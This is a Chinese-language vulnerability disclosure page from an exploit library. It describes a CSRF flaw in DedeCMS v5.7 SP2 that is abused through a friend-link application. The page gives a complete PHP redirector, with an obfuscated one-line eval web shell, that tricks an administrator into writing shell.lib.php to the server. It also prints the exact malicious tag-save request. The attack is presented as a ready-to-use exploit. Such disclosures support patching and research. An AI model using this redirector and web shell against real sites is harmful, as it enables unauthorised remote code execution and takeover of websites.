> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.bylibrary.cn](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/)

> 白阁文库是白泽 Sec 团队维护的一个漏洞 POC 和 EXP 披露以及漏洞复现的开源项目，欢迎各位白帽子访问白阁文库并提出宝贵建议。

[](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell.md "编辑此页")

Affected Version[¶](#affected-version "Permanent link")
-------------------------------------------------------

DedeCMS-V5.7-UTF8-SP2 （ 发布日期 2017-03-15 ）

下载地址： 链接: [https://pan.baidu.com/s/1bprjPx1](https://pan.baidu.com/s/1bprjPx1) 密码: mwdq

PoC[¶](#poc "Permanent link")
-----------------------------

该版本在新建 & 修改标签功能（可以写 PHP 文件到本地）存在 CSRF 漏洞，通过申请友情链接的方式，诱使管理员点击，从而从 Referer 中拿到 后台路径，进而以管理员的身份写一句话到服务器上 GetShell 。

测试：

1.  申请友链

![](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/apply.png)

1.  编辑 友链 信息

![](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/edit.png)

dedecms_csrf.php 的内容如下：

```
<?php
$referer = $_SERVER['HTTP_REFERER'];
$dede_login = str_replace("friendlink_main.php","",$referer);//去掉friendlink_main.php，取得dede后台的路径
$muma = '<'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\''.'c'.'\''.']'.')'.';'.'?'.'>';
$exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php';
$url = $dede_login.$exp;
header("location: ".$url);
exit();
```

1.  管理员登陆后台后 对 友链进行审核

![](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/link_list.png)

1.  审核的时候一般都会点击 地址 看一下网站的内容，由于友链中使用了 header 跳转，所以结果其实是访问了 `http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?@eval($_POST[%27c%27]);?%3E&filename=shell.lib.php` 请求。

![](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/click_res.png)

1.  查看写入到服务器的一句话 `shell.lib.php`

![](https://www.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/shell.png)

References[¶](#references "Permanent link")
-------------------------------------------

1.  [http://0day5.com/archives/4209/](http://0day5.com/archives/4209/)

* * *

最后更新: 2021-03-24